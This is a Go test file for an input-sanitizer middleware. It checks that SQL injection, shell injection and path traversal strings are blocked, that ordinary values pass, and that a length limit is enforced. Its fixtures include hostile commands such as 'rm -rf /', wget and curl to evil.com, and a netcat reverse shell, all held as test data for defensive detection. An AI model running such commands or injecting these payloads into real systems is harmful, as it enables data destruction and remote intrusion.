// middleware/sanitizer_test.go
package middleware

import (
	"testing"

	"go.uber.org/zap"
)

func TestIsMalicious(t *testing.T) {
	s := NewInputSanitizer(zap.NewNop())

	malicious := []struct {
		name  string
		input string
	}{
		{"sql_or", "' OR '1'='1"},
		{"sql_union", "' UNION SELECT * FROM users--"},
		{"sql_drop", "'; DROP TABLE users;--"},
		{"sql_and", "' AND 1=1--"},
		{"sql_comment", "admin'--"},
		{"sql_select_from", "SELECT password FROM users"},
		{"sql_insert", "INSERT INTO users VALUES('hack')"},
		{"sql_delete", "DELETE FROM users WHERE 1=1"},
		{"shell_rm", "; rm -rf /"},
		{"shell_cat", "; cat /etc/passwd"},
		{"shell_subst", "$(whoami)"},
		{"shell_backtick", "`id`"},
		{"shell_wget", "; wget http://evil.com"},
		{"shell_curl", "; curl http://evil.com"},
		{"shell_bash", "| bash -c 'echo pwned'"},
		{"shell_nc", "; nc -e /bin/sh 10.0.0.1 4444"},
		{"path_basic", "../../../etc/passwd"},
		{"path_encoded", "%2e%2e%2f%2e%2e%2fetc/passwd"},
		{"path_mixed", "..%2f../etc/passwd"},
		{"path_windows", "..\\..\\etc\\passwd"},
	}

	for _, tt := range malicious {
		t.Run(
			"block_"+tt.name, func(t *testing.T) {
				if !s.isMalicious(tt.input) {
					t.Errorf("should block: %q", tt.input)
				}
			},
		)
	}

	legitimate := []struct {
		name  string
		input string
	}{
		{"process_name", "discordBot-DEV"},
		{"api_name", "vps-api"},
		{"username", "admin"},
		{"password", "SecurePass123!"},
		{"email", "user@example.com"},
		{"query", "normal query string"},
		{"empty", ""},
		{"uuid", "550e8400-e29b-41d4-a716-446655440000"},
		{"json_simple", `{"name": "test", "value": 123}`},
		{"url_path", "/api/vps/pm2/processes"},
	}

	for _, tt := range legitimate {
		t.Run(
			"allow_"+tt.name, func(t *testing.T) {
				if s.isMalicious(tt.input) {
					t.Errorf("should allow: %q", tt.input)
				}
			},
		)
	}
}

func TestIsMalicious_LongInput(t *testing.T) {
	s := NewInputSanitizer(zap.NewNop())
	input10k := make([]byte, 10000)
	for i := range input10k {
		input10k[i] = 'a'
	}
	if s.isMalicious(string(input10k)) {
		t.Error("10000 chars should be allowed")
	}
	input10001 := make([]byte, 10001)
	for i := range input10001 {
		input10001[i] = 'a'
	}
	if !s.isMalicious(string(input10001)) {
		t.Error("10001 chars should be blocked")
	}
}
